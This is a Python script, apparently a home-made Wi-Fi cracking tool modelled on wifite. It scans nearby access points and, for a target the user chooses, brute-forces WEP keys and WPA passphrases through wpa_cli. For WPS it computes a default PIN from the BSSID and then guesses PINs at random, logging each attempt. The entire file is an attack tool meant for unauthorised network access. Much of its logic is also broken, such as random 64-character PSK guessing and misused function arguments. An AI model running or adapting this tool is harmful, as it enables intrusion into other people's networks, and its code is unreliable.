#!/usr/bin/python

# -*- coding: utf-8 -*-

"""
the tool mack by adel ashraf
I get idea from wifite.py  


you can change it if you know python :D
but dont remove my name :P

    Thanks to everyone that contributed to this project.
***what to do :
    open the tool as root and make sure you open it in the same location
    ex :
    root@pc:~/ cd Desktop && python name.py
    #as the file in Desktop
    1st before open
    get xdotool
    get wpa_cli
    get pbkdf2 in py
    and all import in the tool 
"""
#############
# LIBRARIES #
#############
import subprocess
from subprocess import Popen, call, PIPE
from pbkdf2 import PBKDF2
import os
import sys
import socket
import struct
import fcntl
import errno
import time
import random
# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
# iface name
os.system('clear')
print G+'What is your iface name '+W
iface = raw_input(G+'[*]'+W+'Write the ifname : ')
iff = '-i' +iface
#from wifite :P
print G +"  .;'                    `;,    "
print G +" .;'  ,;'             `;,  `;,   "
print G +".;'  ,;'  ,;'     `;,  `;,  `;,  "
print G +"::   ::   :  "+O+" (|) "+G+"  :   ::   ::  "
print G +"':.  ':.  ':."+O+"  |  "+G+",:'  ,:'  ,:'  "
print G +" ':.  ':.    "+O+"  |  "+G+"   ,:'  ,:' "  
print G +"  ':.       "+O+"   |   "+G+"     ,:' "    
print G +"           "+O+" ___|___"+G
print W
print G + " Wellcome to "+sys.argv[0]+  " tool " + W
time.sleep(3)
# xdotool 
os.system('xdotool windowsize $(xdotool getactivewindow) 100% 90%')
remove_network = 'wpa_cli %s remove_network 0  > /dev/null' %(iff)

subprocess.call(remove_network, shell=True)
add_network ='wpa_cli %s add_network > /dev/null' %(iff)
os.system(add_network)
os.system('clear > /dev/null')
#just see the link
def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s1.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
    return mac
# from wifite 
if os.getuid() != 0:
    print R + ' [!]' + O + ' Error:' + G + "Tool" + O + ' must be run as ' + R + 'root' + W
    print R + ' [!]' + O + ' login as root (' + W + 'su and the pass' + O + ') or try ' + W + 'sudo python '+sys.argv[0] + W 
    exit(1)
    
if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]:# OS
    print O + ' [!]' + R + ' WARNING:' + G + ' Tool' + W + ' must be run on ' + O + 'linux' + W
    exit(1)

fil = open('a.conf', 'w')
fil.write('')
fil.close()
fil = open('a.log', 'w')
fil.write(str(os.getuid())+'\n')


print G+"[#]"+W+"Your scan will start now  :D "
time.sleep(1)
if '1' =="1" :
    os.system('clear > /dev/null')
    scan = 'wpa_cli %s scan > /dev/null' %(iff)
    subprocess.call(scan, shell=True)
    time.sleep(3)
    scan_results = 'wpa_cli %s scan_results' %(iff)
    pro= subprocess.Popen(scan_results, stdout=subprocess.PIPE, stderr=None, shell=True)
    o= pro.communicate()
    pro = 'off'
    fil.write(str(o)+'\n')
    a =o[0]
    if o[0] =='' :
        print R + '[!] ' + 'Error in %s' %(str(iface)) +W
        exit()
    a = a.replace('/' , '')
    a = a.replace('\n' ,' ')
    a = a.split()
    a1 = open('scan.c' ,'w')
    a1.write(o[0])
    a1.close()
    a1 = open('scan.c' ,'r')
    a2 = a1.readline()
    if a2 == ""  :
        print a2
        print '[' + G +'*' +W +'] ' + "scan finish "
    elif a[0:6] =='Failed' :
        print R + '[!] ' + 'Error in %s' %(str(iface)) +W
    elif a2 == "bssid / frequency / signal level / flags / ssid\n" :
        mon_mac(iface)
        print G + a[0]+W+"            | "+ a[1] +" | "+R+ a[2]+W+"  |  "+ a[3] +"                                     |  "+ G +a[5] +W
        a2 = a1.readline()
        print a2
        a3 =len(a2)
        a = 0
        while a== 0  :
            if a3 == 0 :
                print '[' + G +'*' +W +'] ' + "scan finish "
                a +=1
            elif a2[0:6] =='Failed' :
                print R + '[!] ' + 'Error in %s' %(str(iface)) +W
            else :
                a2 = a1.readline()
                print a2
                a3 =len(a2)
    else :
        print R + '[!] ' + 'Error in %s' %(str(iface)) +W
 #the most important info :D           
        
        
    a4 = raw_input("write the bssid you want choose : ")
    a5 = raw_input("write the level of the net work : ")
    a6 = raw_input("write the ussid of the net work : ")
    a5 = a5.replace('-preauth' , '')
    a5 = a5.replace('-PIN' , '')

    if a5 =="[WPA2-PSK-CCMP][ESS]" :
        router = "HG532n"
    elif a5 == "[WPA-PSK-CCMP+TKIP][WPA2-PSK-CCMP+TKIP-preauth][ESS]" :
        router = "netgear or 3com "
    elif a5 == "[WPA-PSK-CCMP+TKIP][WPA2-PSK-CCMP+TKIP][ESS]" :
        router = "AP" #normal
    else :
        router = "none"
    
    
    if len(a4) < 17 :
        print R + "[!] " +W + "ERRor Write the true bssid "
        exit()
    elif len(a4) > 17 :
        print R + "[!] " +W + "ERRor Write the true bssid "
        exit()
    elif a4[2] and a4[5] and a4[8] and a4[11] and a4[14] == ':' :
        os.system('clear > /dev/null')
    else :
        print R + "[!] " +W + "ERRor Write the true bssid "
        exit()

    
    if '1' == '1' :
        if a5[1:18] =="WPA-PSK-CCMP+TKIP" :
            WPA = "WPA-PSK"
            TKIP = "TKIP"
            command1 = 'wpa_cli %s set_network 0 key_mgmt WPA-PSK > /dev/null' %(iff)
            command2 = 'wpa_cli %s set_network 0 group CCMP > /dev/null' %(iff)
            command3 = 'wpa_cli %s set_network 0 group TKIP > /dev/null' %(iff)
            command4 = 'wpa_cli %s set_network 0 pairwise TKIP > /dev/null' %(iff)
        elif a5[1:19] =="WPA2-PSK-CCMP+TKIP" :
            WPA = "WPA-PSK"
            TKIP = "TKIP"
            command1 = 'wpa_cli %s set_network 0 key_mgmt WPA-PSK > /dev/null' %(iff)
            command2 = 'wpa_cli %s set_network 0 group CCMP > /dev/null' %(iff)
            command3 = 'wpa_cli %s set_network 0 group TKIP > /dev/null' %(iff)
            command4 = 'wpa_cli %s set_network 0 pairwise TKIP > /dev/null' %(iff)
        elif a5[1:13] == 'WPA-PSK-TKIP' :
            command1 = 'wpa_cli %s set_network 0 key_mgmt WPA-PSK > /dev/null' %(iff)
            command2 = 'wpa_cli %s set_network 0 group TKIP > /dev/null' %(iff)
            command3 = 'wpa_cli %s set_network 0 group TKIP > /dev/null' %(iff)
            command4 = 'wpa_cli %s set_network 0 pairwise TKIP  > /dev/null' %(iff)
        elif a5[1:14] == 'WPA2-PSK-TKIP' :
            command1 = 'wpa_cli %s set_network 0 key_mgmt WPA-PSK > /dev/null' %(iff)
            command2 = 'wpa_cli %s set_network 0 group TKIP > /dev/null' %(iff)
            command3 = 'wpa_cli %s set_network 0 group TKIP > /dev/null' %(iff)
            command4 = 'wpa_cli %s set_network 0 pairwise TKIP  > /dev/null' %(iff)
        elif a5[1:14] == "WPA2-PSK-CCMP" :
            WPA ="WPA-PSK"
            CCMP = "CCMP"
            command1 = 'wpa_cli %s set_network 0 key_mgmt WPA-PSK > /dev/null' %(iff)
            command2 = 'wpa_cli %s set_network 0 group CCMP > /dev/null' %(iff)
            command3 = 'wpa_cli %s set_network 0 group CCMP > /dev/null' %(iff)
            command4 = 'wpa_cli %s set_network 0 pairwise CCMP  > /dev/null' %(iff)
        elif a5[1:13] == 'WPA-PSK-CCMP' :
            command1 = 'wpa_cli %s set_network 0 key_mgmt WPA-PSK > /dev/null' %(iff)
            command2 = 'wpa_cli %s set_network 0 group CCMP > /dev/null' %(iff)
            command3 = 'wpa_cli %s set_network 0 group CCMP > /dev/null' %(iff)
            command4 = 'wpa_cli %s set_network 0 pairwise CCMP > /dev/null' %(iff)
        elif a5[1:4] =="WEP" :
            add_network = 'wpa_cli %s add_network > /dev/null' %(iff)
            subprocess.call(add_network, shell=True)
            def wep() :
                WEP="WEP"
                shell = 'ABCDEF1234567890'
                def id_generator(size=10, chars=shell):
                    return ''.join(random.choice(chars) for _ in range(size))
                c = ("""wpa_cli %s set_network 0 ssid '"%s"' > /dev/null""")  %(iff, a6)
                c1 = ('wpa_cli %s bssid 0 %s  > /dev/null')  %(iff, a4)
                
                subprocess.call('clear > /dev/null', shell=True)
                subprocess.call(c, shell=True)
                subprocess.call(c1, shell=True)
                while 1 :
                    time.sleep(1)
                    status = 'wpa_cli %s status' %(iff)
                    pro= subprocess.Popen(status, stdout=subprocess.PIPE, stderr=None, shell=True)
                    o= pro.communicate()
                    fil.write(str(o)+'\n')
                    a =  o[0]
                    if a[120:140] == 'wpa_state=ASSOCIATED' :
                        print G + '[*] ' + W + P+'Connecting complete :D' +W
                        print c2[30:41]
                        exit()
                    elif a[120:139] == 'wpa_state=COMPLETE' :
                        print G + '[*] ' + W + P+'Connecting complete :D' +W
                        print c2[30:41]
                        exit()
                    c2 = ('wpa_cli %s set_network 0 wep_key0 %s > /dev/null') %(iff, id_generator())
                    fil.write(c2+ '\n')
                    subprocess.call(c2)
                    enable_network = 'wpa_cli %s enable_network 0 > /dev/null' %(iff)
                    select_network = 'wpa_cli %s select_network 0 > /dev/null' %(iff)
                    subprocess.call(enable_network, shell=True)
                    subprocess.call(select_network, shell=True)
                    time.sleep(1.4)
                return
        elif a5[1:4] == 'WPS' :
            def wps() :
                remove_network = 'wpa_cli %s remove_network 0  > /dev/null' %(iff)
                subprocess.call(remove_network, shell=True)
                bbsid = a4[9]+a4[10]+a4[12]+a4[13]+a4[15]+a4[16]
                pine = 123456
                def wps_pin(pine):
                    accum = 0
                    while(pine):
                        accum += 3 * (pine % 10)
                        pine /= 10
                        accum += pine % 10
                        pine /= 10
                    return (10 - accum % 10) % 10
 
                try:
                    if (len(bbsid) == 6):
                        pin = int(bbsid , 16) % 10000000
                        pin1 = "%07d%d" %(pin, wps_pin(pin))
                        time.sleep(6)
                        print G +"[+]"+W + "try WPS pin : %07d%d" % (pin, wps_pin(pin))
                    else:
                        print G + '[*] ' + W + 'Crack finish '
                except Exception:
                    print G + '[*] ' + W + 'Crack finish '

                code = 'wpa_cli wps_reg %s %s' %(a4, pin1)
                fil1 = open('wps.sh' , 'w')
                fil1.write('#sh\n' + code + ' > /dev/null')
                fil1.close()
                subprocess.call('sh wps.sh', shell=True)
                time.sleep(2)
                remove_network = 'wpa_cli %s remove_network 0  > /dev/null' %(iff)
                subprocess.call(remove_network, shell=True)
                time.sleep(0.5)
                subprocess.call('sh wps.sh', shell=True)
                time.sleep(15)
                if 1==1 :
                    status = 'wpa_cli %s status' %(iff)
                    pro= subprocess.Popen(status, stdout=subprocess.PIPE, stderr=None, shell=True)
                    o= pro.communicate()
                    fil.write(str(o)+'\n')
                    a =  o[0]
                    if a[120:140] == 'wpa_state=ASSOCIATED' :
                        print G + '[*] ' + W + P+'Connecting complete :D' +W
                        print 'pin ' + pin1
                        exit()
                    elif a[120:139] == 'wpa_state=COMPLETED' :
                        print G + '[*] ' + W + P+'Connecting complete :D' +W
                        print 'pin ' + pin1
                        exit()
                    else :
                        def id_generato(size=1, chars='316425789'):
                            return ''.join(random.choice(chars) for _ in range(size))
                        
                        
                        def id_generator(size=2, chars='3164205789'):
                            return ''.join(random.choice(chars) for _ in range(size))
                        
                        
                        def id_generatos(size=1, chars='3164205789'):
                            return ''.join(random.choice(chars) for _ in range(size))
                        
                        
                        while 1 :
                            pino = id_generato() + id_generatos() + id_generator() +id_generator() +id_generator()
                            print G +"[+]"+W + "try WPS pin : %s" %(pino)
                            code = 'wpa_cli wps_reg %s %s' %(a4, pino)
                            fil1 = open('wps.sh' , 'w')
                            fil1.write('#sh\n' + code + ' > /dev/null')
                            fil1.close()
                            subprocess.call('sh wps.sh', shell=True)
                            time.sleep(2)
                            remove_network = 'wpa_cli %s remove_network 0  > /dev/null' %(iff)
                            subprocess.call(remove_network, shell=True)
                            time.sleep(0.5)
                            subprocess.call('sh wps.sh', shell=True)
                            time.sleep(12)
                            if 1==1 :
                                status = 'wpa_cli %s status' %(iff)
                                pro= subprocess.Popen(status, stdout=subprocess.PIPE, stderr=None, shell=True)
                                o= pro.communicate()
                                fil.write(str(o)+'\n')
                                a =  o[0]
                                if a[120:140] == 'wpa_state=ASSOCIATED' :
                                    print G + '[*] ' + W + P+'Connecting complete :D' +W
                                    print 'pin ' + pino
                                    exit()
                                elif a[120:139] == 'wpa_state=COMPLETED' :
                                    print G + '[*] ' + W + P+'Connecting complete :D' +W
                                    print 'pin ' + pino
                                    exit()
                            

        else :
             router = "none"
             print R + '[!] ' +W + P +"Securty level not suported " + W
             exit()
        

        def wpa() :
            # 6 pass in min
            shell = '1a2b3c0d9e8f4756'
            def id_generator(size=64, chars=shell):
                return ''.join(random.choice(chars) for _ in range(size))
            try :
                pro= subprocess.Popen('wpa_cli %s scan' %(iff), stdout=subprocess.PIPE, stderr=None, shell=True)
                aa = '#sh'
                b = """wpa_cli %s set_network 0 ssid '"%s"' > /dev/null""" %(iff, a6)
                c = 'wpa_cli %s bssid 0 %s > /dev/null' %(iff, a4)
                d = command1
                e = command3
                f = command4
                g = 'wpa_cli %s set_network 0 psk %s > /dev/null' %(iff, id_generator())
                fil.write(g + '\n')
                h = 'wpa_cli %s select_network 0 > /dev/null' %(iff)
                z = '''

'''
                crack = (aa + z + b + z + c + z + d + z + e + z + e + z + f + z + g + z + h + z  )
                fil2 = open('wpa.sh', 'w')
                fil2.write(crack)
                fil2.close
                
                time.sleep(0.5)
                os.system('sh wpa.sh')
                time.sleep(2)
                status = 'wpa_cli %s status' %(iff)
                pro= subprocess.Popen(status, stdout=subprocess.PIPE, stderr=None, shell=True)
                o= pro.communicate()    
                a1 =  o[0]
                if a1[120:139] == 'wpa_state=COMPLETED' :
                    print G + ' Connect ' + W
                    print g
                    exit()
                
                g = 'wpa_cli %s set_network 0 psk %s > /dev/null' %(iff, id_generator())
                print G +'[*] try' + W + g[29:100]
                crack = (aa + z + b + z + c + z + d + z + e + z + e + z + f + z + g + z + h + z  )
                fil2 = open('wpa.sh', 'w')
                fil2.write(crack)
                fil2.close
                time.sleep(0.5)
                os.system('sh wpa.sh')
                time.sleep(2)
                pro= subprocess.Popen(status, stdout=subprocess.PIPE, stderr=None, shell=True)
                o= pro.communicate()
                fil.write(str(o)+'\n')
                a1 =  o[0]
                if a1[120:139] == 'wpa_state=COMPLETED' :
                    print G + ' Connect complite' + W
                    print g[29:100]
                    exit()

            except KeyboardInterrupt :
                print P + "you presd ctrl+c " + W
                remove = 'wpa_cli %s remove_network 0 > /dev/null' %(iff)
                os.system(remove)
                exit()
            
            return

        def test(tast) :
            try :
                pro= subprocess.Popen('wpa_cli %s scan_results' %(iff), stdout=subprocess.PIPE, stderr=None, shell=True)
                o1= pro.communicate()
                ao = o1[0]
                if a4 not in o1 :
                    time.sleep(2.1)
                    time.sleep(4)
                    pro= subprocess.Popen('wpa_cli %s scan_results' %(iff), stdout=subprocess.PIPE, stderr=None, shell=True)
                    o1= pro.communicate()
                    ao = o1[0]
                    if a4 not in ao :
                        print R + 'error AP not found '+W
                        print '['+R+'!'+W+']'+'may it close ,reset or far a way'
                        exit()
                    else :
                        tast
                else :
                    tast
            except KeyboardInterrupt :
                RUN_CONFIG = tast
                print P + "you presd ctrl+c " + W
                remove = 'wpa_cli %s remove_network 0 > /dev/null' %(iff)
                os.system(remove)
                RUN_CONFIG.exit_gracefully(0)
                exit()
            return

        #tool start
            
        
    if '1' == '1' :
        os.system('clear')
        print G +"[*] " + W + "Your crack will start"
        if a5[1:18] =="WPA-PSK-CCMP+TKIP" :
            while 1 :
                
                test(wpa())
        elif a5[1:19] =="WPA2-PSK-CCMP+TKIP" :
            while 1 :
                
                test(wpa())
        elif a5[1:14] == "WPA2-PSK-CCMP" :
            while 1 :
                
                test(wpa())
        elif a5[1:13] == 'WPA-PSK-CCMP' :
            while 1 :
                
                test(wpa())
        elif a5[1:13] == 'WPA-PSK-TKIP' :
            while 1 :
                
                test(wpa())
        elif a5[1:14] == 'WPA2-PSK-TKIP' :
            while 1 :
                
                test(wpa())
        elif a5[1:4] =="WEP" :
            test(wep())
        elif a5[1:4] == 'WPS' :
            test(wps())
        else :
            print R+ '[*] ' + W +'Error level net work has not support \n'
    



